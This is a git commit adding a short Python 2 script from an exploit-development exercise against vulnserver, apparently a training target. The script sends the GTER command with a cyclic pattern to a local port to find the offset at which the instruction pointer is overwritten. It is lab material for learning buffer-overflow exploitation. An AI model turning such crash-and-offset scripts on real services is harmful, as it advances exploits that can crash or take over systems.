e04c7a098c12a25fcb75eef7f6e05c9712b7c6f6
bigb0ss <49355913+bigb0sss@users.noreply.github.com>
2020-07-22 00:33:38 -0400

    Create pattern_gter.py

---
+++ vulnserver/GTER - EIP Overwrite/pattern_gter.py
@@ -0,0 +1,19 @@
+import socket
+import os
+import sys
+
+vuln_command = "GTER "
+crash = 160
+pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2A"
+
+payload = ""
+payload += vuln_command
+payload += pattern
+
+print "[+] Sending buffer (Size: %d)" % len(payload)
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('127.0.0.1', 9999))
+print(s.recv(1024))
+s.send(payload)
+s.close()
